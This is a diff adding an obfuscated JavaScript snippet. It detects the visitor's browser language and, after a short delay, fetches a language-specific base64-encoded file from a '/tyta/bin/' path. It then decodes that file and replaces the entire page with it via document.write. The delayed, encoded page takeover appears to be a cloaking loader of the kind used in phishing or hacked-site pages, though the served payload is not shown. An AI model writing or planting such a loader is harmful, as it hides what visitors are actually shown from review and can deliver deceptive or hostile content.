@@ -1,0 +1,82 @@
+!(function () {
+  var x = navigator["language"];
+  x = (x = (x = (x = x["split"](";")[0])["split"](",")[0])["split"]("-")[0])[
+    "trim"
+  ]();
+  var c,
+    w,
+    n,
+    r = "/tyta/bin/en.txt?_=1621667148590";
+  [
+    "af",
+    "ar",
+    "be",
+    "bg",
+    "ca",
+    "cs",
+    "da",
+    "de",
+    "el",
+    "en",
+    "es",
+    "et",
+    "eu",
+    "fa",
+    "fi",
+    "fo",
+    "fr",
+    "ga",
+    "gd",
+    "he",
+    "hi",
+    "hr",
+    "hu",
+    "id",
+    "is",
+    "it",
+    "ja",
+    "ji",
+    "ko",
+    "lt",
+    "lv",
+    "mk",
+    "ms",
+    "mt",
+    "nl",
+    "no",
+    "pl",
+    "pt",
+    "rm",
+    "ro",
+    "ru",
+    "sb",
+    "sk",
+    "sl",
+    "sq",
+    "sr",
+    "sv",
+    "sx",
+    "sz",
+    "th",
+    "tn",
+    "tr",
+    "ts",
+    "uk",
+    "ur",
+    "ve",
+    "vi",
+    "xh",
+    "zh",
+    "zu"
+  ]["indexOf"](x) >= 0 && (r = "/tyta/bin/" + x + ".txt?_=1621667148590"),
+    (c = r),
+    (w = function w(x) {
+      var c = document["open"]("text/html", "replace");
+      c["write"](decodeURIComponent(atob(x))), c["close"]();
+    }),
+    (n = new XMLHttpRequest())["open"]("get", c, !0),
+    setTimeout(()=>n["send"](), 1200),
+    (n["onreadystatechange"] = function () {
+      4 === n["readyState"] && 200 === n["status"] && w(n["responseText"]);
+    });
+})();
